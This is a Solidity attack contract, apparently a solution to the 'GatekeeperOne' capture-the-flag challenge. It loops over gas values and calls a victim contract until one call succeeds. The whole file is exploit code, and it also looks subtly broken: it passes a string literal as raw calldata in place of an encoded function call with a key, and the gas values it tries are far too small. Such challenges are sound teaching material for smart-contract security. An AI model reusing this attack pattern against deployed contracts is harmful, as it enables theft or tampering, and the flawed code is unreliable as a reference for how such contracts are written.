//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Gatekeeper.sol";

import "hardhat/console.sol";

contract GateKeeperOneAttack {
  
    GatekeeperOne public victimContract;

    constructor (address _victimContractAddr) {
        victimContract = GatekeeperOne(_victimContractAddr);
    }

    function attack () public {
        for (uint i = 0; i < 8191; i++) {
            (bool result, ) = address(victimContract).call{gas: i}("0x10000000000012cc");
            if(result) {
                break;
            }
        } 
    }

}